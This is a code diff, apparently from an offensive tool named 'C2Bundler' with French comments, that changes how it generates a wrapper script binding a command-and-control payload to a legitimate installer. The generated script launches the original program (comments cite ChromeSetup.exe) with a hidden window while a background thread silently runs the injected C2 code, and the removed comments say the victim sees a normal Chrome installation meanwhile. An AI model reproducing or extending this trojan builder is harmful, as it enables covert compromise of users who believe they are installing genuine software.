@@ -305,84 +305,82 @@ class C2Bundler:
     def _create_wrapper_code(
         self, original_filename: str, payload_code: str, platform: str
     ) -> str:
-        """Crée le code wrapper qui lance l'original + C2"""
+        """Crée le code wrapper qui lance l'original + C2 sans utiliser f-string"""
 
-        # Important: Indenter le payload_code correctement pour qu'il soit dans run_c2_payload
-        # On ajoute 8 espaces (2 niveaux d'indentation) à chaque ligne du payload
+        # Indenter le payload correctement
         indented_payload = "\n".join(
             "        " + line if line.strip() else line
             for line in payload_code.strip().split("\n")
         )
 
-        wrapper = f'''import os
-import sys
-import subprocess
-import threading
-import time
-from pathlib import Path
+        # Construire le wrapper ligne par ligne (pas de f-string pour éviter les problèmes de quotes)
+        wrapper_lines = [
+            "import os",
+            "import sys",
+            "import subprocess",
+            "import threading",
+            "import time",
+            "from pathlib import Path",
+            "",
+            "if getattr(sys, 'frozen', False):",
+            "    bundle_dir = Path(sys._MEIPASS)",
+            "else:",
+            "    bundle_dir = Path(__file__).parent",
+            "",
+            'original_app = bundle_dir / "resources" / "' + original_filename + '"',
+            "",
+            "def _log(msg):",
+            "    try:",
+            "        log_file = Path(os.getenv('TEMP', '/tmp')) / 'c2_wrapper.log'",
+            "        ts = time.strftime('%Y-%m-%d %H:%M:%S')",
+            "        with open(log_file, 'a', encoding='utf-8') as f:",
+            "            f.write('[' + ts + '] ' + str(msg) + '\\n')",
+            "    except:",
+            "        pass",
+            "",
+            "def run_original_app():",
+            "    try:",
+            "        _log('Starting original app')",
+            "        if original_app.exists():",
+            "            if sys.platform.startswith('win'):",
+            "                subprocess.Popen([str(original_app)], shell=False, creationflags=0x08000000)",
+            "            else:",
+            "                subprocess.Popen([str(original_app)], shell=False)",
+            "    except Exception as e:",
+            "        _log('Error: ' + str(e))",
+            "        try:",
+            "            if sys.platform.startswith('win'):",
+            "                os.startfile(str(original_app))",
+            "            else:",
+            "                subprocess.Popen([str(original_app)], shell=True)",
+            "        except:",
+            "            pass",
+            "",
+            "def run_c2_payload():",
+            "    try:",
+            "        _log('C2 starting')",
+            "        time.sleep(3)",
+        ]
 
-# Obtenir le répertoire du bundle
-if getattr(sys, 'frozen', False):
-    bundle_dir = Path(sys._MEIPASS)
-else:
-    bundle_dir = Path(__file__).parent
+        # Ajouter le payload indenté
+        wrapper_lines.extend(indented_payload.split("\n"))
 
-# Chemin vers l'application originale
-original_app = bundle_dir / "resources" / "{original_filename}"
+        # Ajouter le reste du wrapper
+        wrapper_lines.extend(
+            [
+                "    except Exception as e:",
+                "        _log('C2 error: ' + str(e))",
+                "",
+                "if __name__ == '__main__':",
+                "    c2_thread = threading.Thread(target=run_c2_payload, daemon=False)",
+                "    c2_thread.start()",
+                "    time.sleep(1)",
+                "    _log('Launching original')",
+                "    run_original_app()",
+            ]
+        )
 
-def run_original_app():
-    """Lance l'application originale et attend"""
-    try:
-        if original_app.exists():
-            if sys.platform.startswith('win'):
-                # Sur Windows : lancer l'exe et attendre qu'il se termine
-                # Utiliser subprocess au lieu de os.startfile pour pouvoir wait()
-                process = subprocess.Popen([str(original_app)], 
-                                         shell=False,
-                                         creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
-                # Ne PAS attendre la fin de l'installateur (qui peut prendre du temps)
-                # Juste laisser le processus tourner
-            else:
-                # macOS/Linux: utiliser subprocess
-                subprocess.Popen([str(original_app)], shell=False)
-    except Exception as e:
-        # Fallback: essayer avec shell=True
-        try:
-            if sys.platform.startswith('win'):
-                os.startfile(str(original_app))
-            else:
-                subprocess.Popen([str(original_app)], shell=True)
-        except:
-            pass
-
-def run_c2_payload():
-    """Lance le payload C2 en arrière-plan"""
-    try:
-        # Attendre 3 secondes pour laisser l'app originale démarrer
-        time.sleep(3)
-        # Code C2 ci-dessous
-{indented_payload}
-    except Exception as e:
-        pass
-
-if __name__ == "__main__":
-    # IMPORTANT: Lancer le C2 dans un thread NON-DAEMON
-    # Pour que le processus reste actif même après le lancement de l'app originale
-    c2_thread = threading.Thread(target=run_c2_payload, daemon=False)
-    c2_thread.start()
-    
-    # Attendre un peu que le C2 démarre
-    time.sleep(1)
-    
-    # Lancer l'app originale (ChromeSetup.exe s'exécutera normalement)
-    run_original_app()
-    
-    # Le processus reste actif car le thread C2 tourne en arrière-plan
-    # L'utilisateur voit l'installation Chrome se lancer normalement
-    # Pendant ce temps, le C2 se connecte au serveur
-'''
-
-        return wrapper
+        return "\n".join(wrapper_lines)
 
     def create_bundled_payload(
         self,
